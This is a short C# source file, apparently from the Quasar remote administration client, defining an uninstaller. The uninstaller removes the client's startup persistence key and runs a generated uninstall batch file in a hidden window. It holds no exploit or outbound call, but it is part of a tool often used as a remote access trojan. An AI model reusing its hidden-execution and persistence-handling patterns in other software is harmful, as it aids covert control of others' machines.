using Quasar.Client.Config;
using Quasar.Client.IO;
using System.Diagnostics;
using System.Windows.Forms;

namespace Quasar.Client.Setup
{
    public class ClientUninstaller : ClientSetupBase
    {
        public void Uninstall()
        {
            if (Settings.STARTUP)
            {
                var clientStartup = new ClientStartup();
                clientStartup.RemoveFromStartup(Settings.STARTUPKEY);
            }

            string batchFile = BatchFile.CreateUninstallBatch(Application.ExecutablePath, Settings.LOGSPATH);

            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                FileName = batchFile
            };
            Process.Start(startInfo);
        }
    }
}
